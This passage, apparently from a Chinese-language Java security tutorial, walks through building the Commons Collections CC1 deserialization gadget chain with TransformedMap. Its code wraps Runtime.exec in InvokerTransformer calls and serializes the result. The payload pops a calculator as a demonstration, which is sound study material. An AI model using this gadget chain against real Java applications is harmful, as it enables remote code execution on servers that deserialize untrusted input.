&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ChainedTransformer&lt;/span&gt;(transformers);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;map&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;map.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; TransformedMap.decorate(map, &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;, chainedTransformer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 通过反射创建AnnotationInvocationHandler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;clazz&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Class.forName(&lt;span class=&#34;string&#34;&gt;&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;declaredConstructor&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; clazz.getDeclaredConstructor(Class.class, Map.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;declaredConstructor.setAccessible(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Object&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;exp&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; declaredConstructor.newInstance(Retention.class, transformedMap);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ByteArrayOutputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;barr&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ByteArrayOutputStream&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;ObjectOutputStream&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;oos&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ObjectOutputStream&lt;/span&gt;(barr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oos.writeObject(exp);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;oos.close();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;但是当我们运行后就会发现报错了，这个是因为将对象序列化时需要序列化的对象是必须要实现Serializable接口的，而Runtime这个类它并没有实现这个接口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021113018711.png&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么解决这个问题的办法呢就是将前边的Transformer改造为使用反射的方式进行获取Runtime这个对象。&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 这是通过反射获取Runtime&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;getRuntimeMethod&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Runtime.class.getMethod(&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;Runtime&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;runtime&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; (Runtime) getRuntimeMethod.invoke(&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;runtime.exec(&lt;span class=&#34;string&#34;&gt;&amp;quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// 改造成对应的Transformer&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;[]&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class, Class[].class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;Object.class, Object[].class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;最后完整的生成代码如下:&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;package&lt;/span&gt; org.example;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.Transformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ChainedTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.ConstantTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.functors.InvokerTransformer;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; org.apache.commons.collections.map.TransformedMap;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.ByteArrayInputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.ByteArrayOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectInputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.io.ObjectOutputStream;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.annotation.Retention;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.lang.reflect.Constructor;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.util.HashMap;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; java.util.Map;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;CC1TransformedMap&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Transformer&lt;/span&gt;[]&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ConstantTransformer&lt;/span&gt;(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class, Class[].class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;Object.class, Object[].class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                ),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;InvokerTransformer&lt;/span&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Class&lt;/span&gt;[]&amp;#123;String.class&amp;#125;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Object&lt;/span&gt;[]&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&amp;quot;&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Transformer&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;chainedTransformer&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;ChainedTransformer&lt;/span&gt;(transformers);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;map&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;HashMap&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        map.put(&lt;span class=&#34;string&#34;&gt;&amp;quot;value&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;xxxx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Map&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;transformedMap&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; TransformedMap.decorate(map, &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;, chainedTransformer);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;annotationInvocationHandlerClass&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; Class.forName(&lt;span class=&#34;string&#34;&gt;&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;Constructor&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;annotationInvocationHandlerDeclaredConstructor&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        